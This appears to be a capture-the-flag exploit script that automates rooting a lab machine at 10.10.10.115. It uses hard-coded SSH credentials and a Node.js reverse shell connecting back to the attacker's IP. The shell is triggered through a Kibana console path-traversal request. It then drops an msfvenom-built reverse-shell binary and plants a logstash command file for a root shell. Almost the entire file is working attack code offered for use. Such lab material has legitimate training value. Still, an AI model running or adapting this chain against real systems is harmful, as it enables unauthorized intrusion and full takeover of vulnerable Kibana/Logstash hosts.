import re
import urllib
import base64
import subprocess
from pwn import *
from time import sleep
import netifaces as ni
from threading import Thread

ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

def shell(user):
	if user == "security":
		p = ssh(host='10.10.10.115',user='security',password='spanish.is.key')
		p = p.process("/bin/bash")
		p.interactive()
	else:
		p = ssh(host='10.10.10.115',user='security',password='spanish.is.key')
		p = p.process("/bin/bash")
		payload = """ (function(){\r\n    var net = require(\\"net\\"),\r\n        cp = require(\\"child_process\\"),\r\n        sh = cp.spawn(\\"/bin/sh\\", []);\r\n    var client = new net.Socket();\r\n    client.connect(1337, \\"ipaddress\\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return /a/;\r\n})();"""
		payload = re.sub('ipaddress',"{}".format(ip),payload)
		p.sendline(' python -c "open(\'/tmp/new.js\',\'wb\').write(\'\'\'{}\'\'\')"'.format(payload))
		log.info('Sending payload')
		l = listen('1337')
		log.info('Sending payload')
		p.sendline('curl "http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/new.js"&')
		log.info('payload sent')
		c = l.wait_for_connection()
		if user == "kibana":
			log.info('Popping Kibana Shell')
			c.interactive()
		else:
			log.info('Writing reverse shell')
			q = subprocess.Popen(['/usr/bin/msfvenom','-p','linux/x64/shell_reverse_tcp','LHOST={}'.format(ip),'LPORT=1234','-f','elf'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			stdout,stderr = q.communicate()
			c.sendline(''' echo '{}' > /tmp/1 '''.format(base64.b64encode(stdout)))
			c.sendline('cat /tmp/1 | base64 -d > /tmp/shell')
			c.sendline('chmod +x /tmp/shell')
			log.info('Writing grok pattern')
			c.sendline('echo "Ejecutar comando :  /tmp/shell">/opt/kibana/logstash_1337')
			c.sendline('chmod +x /opt/kibana/logstash_1337')
			m = listen('1234').wait_for_connection()
			log.info('Popping root shell')
			m.interactive()
if __name__=="__main__":
	print '''  _  _             _  _    ___     _                       _     
 | || |   __ _    | || |  / __|   | |_    __ _     __     | |__  
 | __ |  / _` |    \_, |  \__ \   |  _|  / _` |   / _|    | / /  
 |_||_|  \__,_|   _|__/   |___/   _\__|  \__,_|   \__|_   |_\_\  
_|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
													By MrR3boot\n'''
	print 'Choose an option :)'
	print '1. security'
	print '2. kibana'
	print '3. root'
	input  = raw_input('> ').strip()
	if input == '1':
		shell('security')
	elif input == '2':
		shell('kibana')
	else:
		shell('root')
